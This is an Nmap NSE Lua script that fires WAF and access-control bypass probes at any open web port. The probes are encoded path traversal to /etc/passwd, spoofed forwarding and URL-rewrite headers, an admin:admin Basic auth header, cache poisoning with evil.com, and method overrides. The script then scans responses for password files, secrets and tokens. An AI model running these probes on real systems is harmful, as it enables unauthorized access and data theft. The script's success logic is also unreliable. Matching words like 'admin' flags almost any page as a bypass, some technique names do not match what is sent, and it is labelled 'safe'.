local stdnse = require "stdnse"
local http = require "http"
local string = require "string"

description = [[Tests for WAF/security protection bypass techniques using various payload encodings, headers, HTTP method overrides, path normalization tricks, and content-type manipulations.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"safe", "discovery"}

portrule = function(host, port)
    return port.protocol == "tcp" and port.state == "open" and
        (port.service == "http" or port.service == "https")
end

local bypass_techniques = {
    { name = "Case Bypass", path = "/..%252f..%252fetc/passwd", headers = {} },
    { name = "Double URL Encode", path = "/%2561%2564%256d%2569%256e", headers = {} },
    { name = "Path Traversal", path = "/....//....//etc/passwd", headers = {} },
    { name = "Unicode Bypass", path = "/%c0%ae%c0%ae/admin", headers = {} },
    { name = "Path Confusion", path = "/admin..;/", headers = {} },
    { name = "Null Byte", path = "/admin%00/", headers = {} },
    { name = "Parameter Pollution", path = "/?id=1&id=2&id=3", headers = {} },
    { name = "Method Override", path = "/api/admin", headers = { ["X-HTTP-Method-Override"] = "GET", ["X-HTTP-Method"] = "GET", ["X-Method-Override"] = "GET" } },
    { name = "Content-Type Bypass", path = "/admin", headers = { ["Content-Type"] = "application/x-www-form-urlencoded", ["Accept"] = "text/html,application/xhtml+xml" } },
    { name = "X-Forwarded Bypass", path = "/admin", headers = { ["X-Forwarded-For"] = "127.0.0.1", ["X-Real-IP"] = "127.0.0.1", ["X-Originating-IP"] = "127.0.0.1" } },
    { name = "HTTP/1.0 Downgrade", path = "/admin", headers = {} },
    { name = "Protocol Confusion", path = "/admin", headers = { ["X-Forwarded-Proto"] = "http" } },
    { name = "Header Pollution", path = "/admin", headers = { ["X-Forwarded-Host"] = "localhost", ["X-Forwarded-Server"] = "localhost" } },
    { name = "Basic Auth Bypass", path = "/admin", headers = { ["Authorization"] = "Basic YWRtaW46YWRtaW4=" } },
    { name = "Custom Header", path = "/admin", headers = { ["X-Original-URL"] = "/admin", ["X-Rewrite-URL"] = "/admin" } },
    { name = "Cache Poisoning", path = "/", headers = { ["X-Forwarded-Host"] = "evil.com" } },
    { name = "Tab Injection", path = "/admin\t/", headers = {} },
    { name = "Dot Segment", path = "/./admin/../admin", headers = {} },
    { name = "Backslash", path = "/admin\\", headers = {} },
    { name = "HTTP Method Tunneling", path = "/admin", headers = { ["X-HTTP-Method"] = "TRACE", ["X-HTTP-Method-Override"] = "TRACE" } },
}

local success_patterns = {
    { pattern = "root:.*:0:0:", desc = "/etc/passwd contents" },
    { pattern = "admin", desc = "Admin panel accessed" },
    { pattern = "dashboard", desc = "Dashboard accessed" },
    { pattern = "config", desc = "Configuration accessed" },
    { pattern = "password", desc = "Password field leaked" },
    { pattern = "secret", desc = "Secret exposed" },
    { pattern = "token", desc = "Token exposed" },
    { pattern = "api_key", desc = "API key exposed" },
    { pattern = "internal", desc = "Internal endpoint" },
    { pattern = "unauthorized", desc = "Unauthorized access to protected resource" },
}

action = function(host, port)
    local result = stdnse.output_table()
    local findings = {}

    local ok, baseline = pcall(http.get, host, port, "/", { timeout = 5000 })
    local baseline_status = ok and baseline and baseline.status or 0

    for _, tech in ipairs(bypass_techniques) do
        local ok2, response = pcall(http.get, host, port, tech.path, { header = tech.headers, timeout = 5000 })
        if ok2 and response and response.status then
            local finding = {
                technique = tech.name,
                path = tech.path,
                status = response.status,
                response_size = response.body and #response.body or 0,
            }

            if tech.path == "/api/admin" and tech.name == "Method Override" then
                if response.status == 200 or response.status == 201 or response.status == 204 then
                    finding.bypass_successful = true
                    finding.reason = "Method override bypass (expected non-200)"
                end
            elseif response.status == 200 then
                if baseline_status ~= 200 then
                    finding.bypass_successful = true
                    finding.reason = "Status 200 where baseline is " .. baseline_status
                end
            end

            if response.body and #response.body > 0 then
                local body_lower = response.body:lower()
                for _, sp in ipairs(success_patterns) do
                    if body_lower:find(sp.pattern) then
                        finding.bypass_successful = true
                        finding.signature = sp.desc
                        break
                    end
                end
            end

            if finding.bypass_successful then
                table.insert(findings, finding)
            end
        end
    end

    if #findings == 0 then
        return stdnse.format_output(false, "No WAF bypass techniques succeeded")
    end

    result.findings = findings
    result.bypass_count = #findings
    result.techniques_tested = #bypass_techniques

    return stdnse.format_output(true, result)
end
